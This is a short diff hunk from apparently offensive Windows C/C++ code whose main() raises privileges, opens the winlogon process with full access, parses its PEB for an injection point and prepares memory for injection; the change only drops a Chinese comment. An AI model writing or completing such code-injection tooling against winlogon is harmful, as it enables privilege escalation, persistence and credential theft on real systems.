@@ -906,7 +906,7 @@ int main() {
     LocalPrivilege();
     HANDLE hWinLogon = ElevateHandle(hWinLogonLowPriv, PROCESS_ALL_ACCESS, OBJ_INHERIT);
     // Step 2: 解析PEB 寻找注入点
-    PVOID ImageBase = GetProcessImageBase(hWinLogon); // 假设已有此函数
+    PVOID ImageBase = GetProcessImageBase(hWinLogon);
     PVOID HookAddress = FindInjectionPoint(hWinLogon, ImageBase);
 
     // Step 3: 寻找内存空洞 分配内存
